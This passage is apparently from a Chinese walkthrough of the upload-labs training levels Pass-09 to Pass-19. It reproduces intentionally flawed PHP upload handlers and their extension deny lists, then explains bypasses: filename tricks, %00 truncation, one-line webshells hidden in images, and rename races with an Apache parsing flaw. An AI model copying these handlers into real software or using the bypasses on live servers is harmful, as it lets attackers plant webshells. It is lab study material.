class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>])) &#123;</span><br><span class="line">                $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>原理同Pass-06</strong>，上传文件名后加上<strong>点+空格+点</strong>，改为<code>09.php. .</code> </p><p>pht</p><h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = str_ireplace($deny_ext,<span class="string">""</span>, $file_name);</span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name)) &#123;</span><br><span class="line">            $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键代码<code>$file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);</code></p><p>当后缀名中出现黑名单列表中的内容时，就替换为空，所以可以用pphphp这样的后缀绕过。</p><p>pht</p><h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">'上传失败！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>strrpos — 计算指定字符串在目标字符串中最后一次出现的位置</p><p>说明<a href="http://php.net/manual/zh/function.strrpos.php#refsect1-function.strrpos-description" target="_blank" rel="noopener"> ¶</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int strrpos ( string $haystack , string $needle [, int $offset = 0 ] )</span><br></pre></td></tr></table></figure><p>返回字符串 <code>haystack</code> 中 <code>needle</code> 最后一次出现的数字位置。注意 PHP4 中，needle 只能为单个字符。如果 needle 被指定为一个字符串，那么将仅使用第一个字符。</p><p>substr — 返回字符串的子串</p><p>说明<a href="http://php.net/manual/zh/function.substr.php#refsect1-function.substr-description" target="_blank" rel="noopener"> ¶</a></p><p>string <strong>substr</strong> ( string <code>$string</code> , int <code>$start</code> [, int <code>$length</code> ] )</p><p>返回字符串 <code>string</code> 由 <code>start</code> 和 <code>length</code> 参数指定的子字符串。</p><h4 id="pass-8"><a href="#pass-8" class="headerlink" title="pass"></a>pass</h4><p>%00截断</p><p>原理：</p><p>截断的核心，就是<code>chr(0)</code>这个字符  </p><p> 先说一下这个字符，这个字符不为空(Null)，也不是空字符(“”)，更不是空格！  </p><p> 当程序在输出含有<code>chr(0)</code>变量时，<code>chr(0)</code>后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生  </p><p>0x00，%00，/00之类 的也是一样的</p><p><a href="https://www.cnblogs.com/milantgh/p/3612978.html" target="_blank" rel="noopener">https://www.cnblogs.com/milantgh/p/3612978.html</a></p><p><a href="https://www.cnblogs.com/hack0ne/p/4603144.html" target="_blank" rel="noopener">https://www.cnblogs.com/hack0ne/p/4603144.html</a></p><h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>%00截断</p><h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_type = getReailFileType($temp_file);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($file_type == <span class="string">'unknown'</span>)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_type;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>010editor 打开一个png，在png最后加上一句话木马</p><p>绕过文件头检查，添加GIF图片的文件头<code>GIF89a</code>，绕过GIF图片检查。 </p><h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>getimagesize()</strong> 函数将测定任何 GIF，JPG，PNG，SWF，SWC，PSD，TIFF，BMP，IFF，JP2，JPX，JB2，JPC，XBM 或 WBMP 图像文件的大小并返回图像的尺寸以及文件类型和一个可以用于普通 HTML 文件中 <code>IMG</code> 标记中的 height/width 文本字符串。 </p><p>image_type_to_extension — 取得图像类型的文件后缀 </p><h4 id="pass-9"><a href="#pass-9" class="headerlink" title="pass"></a>pass</h4><p>010editor 打开一个png，在png最后加上一句话木马</p><p>绕过文件头检查，添加GIF图片的文件头<code>GIF89a</code>，绕过GIF图片检查。 </p><h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $res = isImage($temp_file);</span><br><span class="line">    <span class="keyword">if</span>(!$res)&#123;</span><br><span class="line">        $msg = <span class="string">"文件未知，上传失败！"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $img_path = $UPLOAD_ADDR.<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$res;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exif_imagetype — 判断一个图像的类型 </p><h4 id="pass-10"><a href="#pass-10" class="headerlink" title="pass"></a>pass</h4><p>010editor 打开一个png，在png最后加上一句话木马</p><p>绕过文件头检查，添加GIF图片的文件头<code>GIF89a</code>，绕过GIF图片检查。</p><h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>原理：将一个正常显示的图片，上传到服务器。寻找图片被渲染后与原始图片部分对比仍然相同的数据块部分，将Webshell代码插在该部分，然后上传。具体实现需要自己编写Python程序，人工尝试基本是不可能构造出能绕过渲染函数的图片webshell的。 </p><h4 id="pass-11"><a href="#pass-11" class="headerlink" title="pass"></a>pass</h4><p>010editor 打开一个png，在png最后加上一句话木马</p><p>绕过文件头检查，添加GIF图片的文件头<code>GIF89a</code>，绕过GIF图片检查。</p><h3 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    $upload_file = $UPLOAD_ADDR . <span class="string">'/'</span> . $file_name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = $UPLOAD_ADDR . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">'上传失败！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="pass-12"><a href="#pass-12" class="headerlink" title="pass"></a>pass</h4><p>利用条件竞争删除文件时间差绕过。 </p><p>文件名为：“17.php:.jpg”,上传成功后会生成一个17.php空文件，将文件名改为“17.&lt;&lt;&lt;”后再次上传 </p><h3 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h3><p>利用上传重命名竞争+Apache解析漏洞，成功绕过。</p><p>上传名字为<code>18.php.7Z</code>的文件，快速重复提交该数据包，会提示文件已经被上传，但没有被重命名。</p><p>然后利用Apache的解析漏洞，即可获得shell </p><h3 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">"php"</span>,<span class="string">"php5"</span>,<span class="string">"php4"</span>,<span class="string">"php3"</span>,<span class="string">"php2"</span>,<span class="string">"html"</span>,<span class="string">"htm"</span>,<span class="string">"phtml"</span>,<span class="string">"pht"</span>,<span class="string">"jsp"</span>,<span class="string">"jspa"</span>,<span class="string">"jspx"</span>,<span class="string">"jsw"</span>,<span class="string">"jsv"</span>,<span class="string">"jspf"</span>,<span class="string">"jtml"</span>,<span class="string">"asp"</span>,<span class="string">"aspx"</span>,<span class="string">"asa"</span>,<span class="string">"asax"</span>,<span class="string">"ascx"</span>,<span class="string">"ashx"</span>,<span class="string">"asmx"</span>,<span class="string">"cer"</span>,<span class="string">"swf"</span>,<span class="string">"htaccess"</span>);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[<span class="string">'save_name'</span>];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $img_path = $UPLOAD_ADDR . <span class="string">'/'</span> .$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>], $img_path)) &#123; </span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                $msg = <span class="string">'上传失败！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $msg = <span 